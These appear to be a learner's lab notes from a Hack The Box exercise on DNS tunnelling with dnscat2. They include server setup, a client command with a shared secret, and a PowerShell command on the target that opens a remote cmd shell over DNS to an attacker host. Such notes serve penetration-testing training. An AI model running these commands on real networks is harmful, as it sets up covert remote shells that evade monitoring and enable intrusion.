```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

#### Starting the dnscat2 server
```shell-session
AhmaDb0x@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
---
```shell-session
./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local
```
---
#### Cloning dnscat2-powershell to the Attack Host
```shell-session
AhmaDb0x@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

#### Importing dnscat2.ps1
```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.15.81 -Domain ahmad.pwn -PreSharedSecret 217200aa3a46f5626ea49a6ea9e5a414 -Exec cmd 
```



----
```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```
---
```shell-session
dnscat2> window -i 1
```





